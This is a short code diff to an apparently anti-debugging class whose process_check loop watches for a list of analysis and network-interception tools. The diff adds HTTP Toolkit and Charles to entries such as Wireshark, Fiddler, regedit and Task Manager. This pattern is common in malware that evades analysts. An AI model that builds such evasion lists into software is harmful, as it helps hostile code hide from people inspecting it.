@@ -648,9 +648,11 @@ class Antidebug:
     def process_check(self):
         while True:
             PROCESSES = [
+                "http toolkit.exe",
                 "httpdebuggerui.exe",
                 "wireshark.exe",
                 "fiddler.exe",
+                "charles.exe",
                 "regedit.exe",
                 "cmd.exe",
                 "taskmgr.exe",
